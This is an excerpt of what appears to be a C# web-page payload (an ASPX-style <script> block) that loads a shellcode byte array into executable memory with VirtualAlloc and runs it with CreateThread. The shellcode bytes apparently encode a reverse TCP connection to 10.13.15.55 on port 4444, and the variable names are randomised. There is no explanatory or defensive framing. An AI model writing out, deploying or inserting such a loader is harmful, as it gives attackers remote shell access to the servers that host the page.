...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,0x0d,0x0f,0x37,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr hJA = VirtualAlloc(IntPtr.Zero,(UIntPtr)p6V.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(p6V,0,hJA,p6V.Length);
        IntPtr pAdXcAbnHU3 = IntPtr.Zero;
        IntPtr gaAM3PCW0z = CreateThread(IntPtr.Zero,UIntPtr.Zero,hJA,IntPtr.Zero,0,ref pAdXcAbnHU3);
    }
</script>
